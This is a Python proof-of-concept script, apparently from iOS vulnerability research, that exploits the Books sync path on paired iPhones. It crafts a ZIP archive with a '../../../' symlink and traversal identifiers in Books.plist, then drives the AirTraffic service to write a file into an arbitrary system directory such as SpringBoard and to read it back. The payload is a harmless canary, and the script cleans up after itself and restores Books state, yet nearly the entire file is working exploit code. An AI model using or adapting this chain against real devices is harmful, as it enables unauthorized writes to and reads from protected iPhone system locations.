#!/usr/bin/env python3
"""Fresh-file write and export-readback PoC for paired iPhones."""

from __future__ import annotations

import argparse
import hashlib
import io
import json
import os
import plistlib
import posixpath
import re
import secrets
import stat
import struct
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parent
TARGET_HEADER = ROOT / "Sources" / "airlift_target.h"
DEVICE_HELPER = ROOT / "build" / "device_helper"
AIRTRAFFIC_HOST = ROOT / "build" / "airtraffic_host"
TARGET_TEXT = TARGET_HEADER.read_text(encoding="utf-8")


def header_string(name: str) -> str:
    match = re.search(
        rf'^#define\s+{re.escape(name)}\s+@"([^"]*)"$',
        TARGET_TEXT,
        re.MULTILINE,
    )
    if not match:
        raise RuntimeError(f"missing {name} in {TARGET_HEADER}")
    return match.group(1)


def header_targets(name: str) -> tuple[tuple[str, str], ...]:
    match = re.search(
        rf"^#define\s+{re.escape(name)}\(X\)\s+(.*?)(?=^\s*$)",
        TARGET_TEXT,
        re.MULTILINE | re.DOTALL,
    )
    if not match:
        raise RuntimeError(f"missing {name} in {TARGET_HEADER}")
    targets = tuple(
        re.findall(r'X\(@"([^"]+)",\s*@"([^"]+)"\)', match.group(1))
    )
    if not targets:
        raise RuntimeError(f"empty {name} in {TARGET_HEADER}")
    return targets


TESTED_BUILDS = frozenset(header_targets("AIRLIFT_TESTED_BUILDS"))
SOURCE_PREFIX = header_string("AIRLIFT_SOURCE_PREFIX")
LINK_PREFIX = header_string("AIRLIFT_LINK_PREFIX")
RECOVERED_PREFIX = header_string("AIRLIFT_RECOVERED_PREFIX")
CANARY_PREFIX = header_string("AIRLIFT_CANARY_PREFIX")

DEFAULT_TARGET = "/var/mobile/Library/SpringBoard"
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SZ_EXTRA_ID = 0x5A53


class AirLiftError(RuntimeError):
    def __init__(self, message: str, details: dict[str, Any] | None = None):
        super().__init__(message)
        self.details = details


def device_version(
    device_properties: dict[str, Any], properties: dict[str, Any]
) -> str:
    value = device_properties.get("osVersionNumber")
    if not isinstance(value, str):
        value = (
            properties.get("software", {})
            .get("osVersionNumber", {})
            .get("stringValue")
        )
    return value if isinstance(value, str) else "unknown"


def device_build(
    device_properties: dict[str, Any], properties: dict[str, Any]
) -> str:
    value = device_properties.get("osBuildUpdate")
    if not isinstance(value, str):
        value = (
            properties.get("software", {})
            .get("osBuildVersions", {})
            .get("buildVersion", {})
            .get("name")
        )
    return value if isinstance(value, str) else "unknown"


def available_devices(devices: list[dict[str, Any]]) -> list[dict[str, Any]]:
    matches: list[dict[str, Any]] = []
    for device in devices:
        properties = device.get("properties", {})
        connection = device.get("connectionProperties")
        hardware = device.get("hardwareProperties")
        state = device.get("deviceProperties")
        if not isinstance(connection, dict):
            connection = properties.get("connection", {})
        if not isinstance(hardware, dict):
            hardware = properties.get("hardware", {})
        if not isinstance(state, dict):
            state = properties.get("state", {})

        udid = hardware.get("udid")
        product = hardware.get("productType")
        version = device_version(state, properties)
        build = device_build(state, properties)
        tested = (version, build) in TESTED_BUILDS
        if not (
            hardware.get("reality") == "physical"
            and connection.get("pairingState") == "paired"
            and isinstance(product, str)
            and product.startswith("iPhone")
            and isinstance(udid, str)
            and udid
        ):
            continue

        transport = {
            "localNetwork": "Wi-Fi",
            "wired": "USB",
        }.get(connection.get("transportType"), "paired")
        name = state.get("name")
        model = hardware.get("marketingName")
        matches.append(
            {
                "name": name if isinstance(name, str) and name else product,
                "model": model if isinstance(model, str) and model else product,
                "product": product,
                "version": version,
                "build": build,
                "transport": transport,
                "tested": tested,
                "udid": udid,
            }
        )
    return sorted(matches, key=lambda item: (item["name"], item["udid"]))


def selected_device(device: dict[str, Any]) -> dict[str, Any]:
    if not device["tested"]:
        print(
            f"Warning: {device['product']} on iOS {device['version']} "
            f"({device['build']}) is expected to work but has not been tested.",
            file=sys.stderr,
        )
    return device


def choose_device(
    devices: list[dict[str, Any]], requested: str | None
) -> dict[str, Any]:
    if not devices:
        raise AirLiftError("no paired physical iPhone found")

    if requested:
        for device in devices:
            if device["udid"].casefold() == requested.casefold():
                return selected_device(device)
        raise AirLiftError("requested device is not connected and compatible")

    if not sys.stdin.isatty():
        raise AirLiftError("device selection requires a terminal or --device UDID")

    print("Available compatible iPhones:", file=sys.stderr)
    for index, device in enumerate(devices, 1):
        print(f"  [{index}] {device['name']}", file=sys.stderr)
        print(
            f"      {device['model']} · iOS {device['version']} "
            f"({device['build']}) · "
            f"{device['transport']}",
            file=sys.stderr,
        )
        print(f"      {device['udid']}", file=sys.stderr)

    while True:
        print("Select device: ", end="", file=sys.stderr, flush=True)
        try:
            value = sys.stdin.readline()
        except KeyboardInterrupt as error:
            print(file=sys.stderr)
            raise AirLiftError("device selection cancelled") from error
        if not value:
            raise AirLiftError("device selection cancelled")
        try:
            selection = int(value.strip())
        except ValueError:
            selection = 0
        if 1 <= selection <= len(devices):
            return selected_device(devices[selection - 1])
        print(f"Enter a number from 1 to {len(devices)}.", file=sys.stderr)


def resolve_device(requested: str | None) -> dict[str, Any]:
    command = [
        "xcrun",
        "devicectl",
        "list",
        "devices",
        "--timeout",
        "8",
        "--quiet",
        "--json-output",
        "-",
    ]
    completed = subprocess.run(
        command,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        timeout=12,
    )
    devices = json.loads(completed.stdout)["result"]["devices"]
    return choose_device(available_devices(devices), requested)


def normalize_target(value: str) -> str:
    target = posixpath.normpath(value)
    if not target.startswith("/") or target == "/" or "\x00" in target:
        raise AirLiftError("target must be a non-root absolute directory")
    components = target[1:].split("/")
    if any(component in ("", ".", "..") for component in components):
        raise AirLiftError("target contains an unsafe path component")
    if len(target.encode()) > 768:
        raise AirLiftError("target path is too long")
    return target


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def run_json(command: list[str], timeout: int) -> dict[str, Any]:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    result: dict[str, Any] | None = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            value = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(value, dict):
            result = value
            break
    if result is None:
        raise AirLiftError(f"{Path(command[0]).name} returned no JSON result")
    result["exitCode"] = completed.returncode
    return result


def native(command: str, udid: str, *arguments: str) -> dict[str, Any]:
    return run_json(
        [os.fspath(DEVICE_HELPER), command, udid, *arguments], timeout=60
    )


def error_details(error: Exception) -> dict[str, str]:
    return {"type": type(error).__name__, "message": str(error)}


def operation_ok(result: dict[str, Any]) -> bool:
    return bool(
        result.get("exitCode") == 0
        and result.get("targetGatePassed")
        and result.get("operation", {}).get("ok")
    )


def preflight(udid: str) -> dict[str, Any]:
    result = native("probe", udid)
    operation = result.get("operation", {})
    if not operation_ok(result):
        raise AirLiftError(
            "device/build preflight failed", {"preflight": result}
        )
    return operation


def attempt(
    udid: str,
    target: str,
    leaf: str,
    payload: bytes,
    *,
    verbose: bool,
) -> dict[str, Any]:
    token = secrets.token_hex(10)
    source = f"{SOURCE_PREFIX}{token}"
    link_destination = f"{LINK_PREFIX}{token}"
    recovered = f"{RECOVERED_PREFIX}{token}"
    link_identifier = f"../../{source}/p0/p1/p2/link"
    target_path = posixpath.join(target, leaf)
    target_identifier = posixpath.relpath(target_path, AIRLOCK_ROOT)
    payload_identifier = f"../../{source}/payload"

    identifiers = [link_identifier, payload_identifier, target_identifier]
    destinations = [
        link_destination,
        posixpath.join(link_destination, leaf),
        recovered,
    ]

    with tempfile.TemporaryDirectory(prefix="airlift-") as temporary:
        work = Path(temporary)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        expected_path = work / "expected.bin"
        snapshot_root = work / "books-snapshot"
        snapshot_root.mkdir()
        archive_path.write_bytes(build_archive(target, payload))
        books_path.write_bytes(build_books(identifiers))
        expected_path.write_bytes(payload)

        preflight(udid)
        snapshot: dict[str, Any] = {"operation": {"ok": False}}
        stage: dict[str, Any] = {"operation": {"ok": False}}
        atc: dict[str, Any] = {"ok": False}
        finish: dict[str, Any] = {"operation": {"ok": False}}
        operation_error: Exception | None = None
        finish_error: Exception | None = None
        cleanup_authorized = False
        airtraffic_attempted = False
        try:
            snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
            if not operation_ok(snapshot):
                raise AirLiftError("could not preserve Books state")
            present_paths = snapshot.get("operation", {}).get("presentPaths", [])
            if present_paths:
                print(
                    f"Preserving {len(present_paths)} existing Books sync "
                    f"artifact{'s' if len(present_paths) != 1 else ''}.",
                    file=sys.stderr,
                )
            stage = native(
                "stage",
                udid,
                source,
                link_destination,
                recovered,
                os.fspath(archive_path),
                os.fspath(books_path),
                os.fspath(snapshot_root),
            )
            cleanup_authorized = bool(
                stage.get("operation", {}).get("cleanupAuthorized")
            )
            if operation_ok(stage):
                airtraffic_attempted = True
                command = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    command.extend((identifier, destination))
                atc = run_json(command, timeout=120)
        except Exception as error:
            operation_error = error
        finally:
            if cleanup_authorized:
                try:
                    finish = native(
                        "finish",
                        udid,
                        source,
                        link_destination,
                        recovered,
                        os.fspath(expected_path),
                        target[1:],
                        leaf,
                        "1" if airtraffic_attempted else "0",
                        os.fspath(snapshot_root),
                    )
                except Exception as error:
                    finish_error = error
            else:
                finish["operation"]["cleanupSkipped"] = True

    operation = finish.get("operation", {})
    result = {
        "booksPreimagePaths": snapshot.get("operation", {}).get(
            "presentPaths", []
        ),
        "stageSucceeded": operation_ok(stage),
        "airTrafficSucceeded": bool(atc.get("exitCode") == 0 and atc.get("ok")),
        "exactBytesRecovered": bool(operation.get("recoveredBytesMatch")),
        "cleanupComplete": bool(operation.get("cleanupComplete")),
        "targetAbsent": operation.get("targetAbsent"),
        "booksPreimageRestored": operation.get("booksPreimageRestored"),
    }
    attempt_ok = bool(
        result["stageSucceeded"]
        and result["airTrafficSucceeded"]
        and result["exactBytesRecovered"]
        and result["cleanupComplete"]
    )
    if verbose or not attempt_ok:
        diagnostics: dict[str, Any] = {
            "booksSnapshot": snapshot,
            "stage": stage,
            "airTraffic": atc,
            "finish": finish,
        }
        if operation_error:
            diagnostics["operationError"] = error_details(operation_error)
        if finish_error:
            diagnostics["finishError"] = error_details(finish_error)
        result["diagnostics"] = diagnostics
    return result


def run(
    target: str, requested_device: str | None, *, verbose: bool
) -> dict[str, Any]:
    if not DEVICE_HELPER.is_file() or not AIRTRAFFIC_HOST.is_file():
        raise AirLiftError("helpers are not built; run make first")

    device = resolve_device(requested_device)
    udid = device["udid"]
    build = device["build"]
    preflight(udid)
    leaf = f"{CANARY_PREFIX}{secrets.token_hex(16)}.bin"
    payload = (
        f"airlift canary\nbuild={build}\nnonce={secrets.token_hex(24)}\n"
    ).encode()

    primary = attempt(udid, target, leaf, payload, verbose=verbose)
    exact = primary["exactBytesRecovered"]
    clean = primary["cleanupComplete"]
    preflight(udid)
    return {
        "ok": bool(exact and clean),
        "device": {
            "product": device["product"],
            "version": device["version"],
            "build": build,
            "tested": device["tested"],
        },
        "targetDirectory": target,
        "generatedLeaf": leaf,
        "payloadLength": len(payload),
        "payloadSHA256": hashlib.sha256(payload).hexdigest(),
        "newFileWrite": "confirmed" if exact else "not-confirmed",
        "exportRead": "confirmed" if exact else "not-confirmed",
        "exactBytesRecovered": exact,
        "cleanupComplete": clean,
        "existingFileTargeted": False,
        "primary": primary,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--device", metavar="UDID", help="skip the device picker")
    parser.add_argument(
        "--verbose", action="store_true", help="include helper diagnostics"
    )
    arguments = parser.parse_args()
    try:
        result = run(
            normalize_target(arguments.target),
            arguments.device,
            verbose=arguments.verbose,
        )
    except (AirLiftError, OSError, subprocess.SubprocessError, ValueError) as error:
        result = {"ok": False, "error": str(error)}
        if isinstance(error, AirLiftError) and error.details:
            result["diagnostics"] = error.details
        print(json.dumps(result, sort_keys=True))
        return 1
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0 if result["ok"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
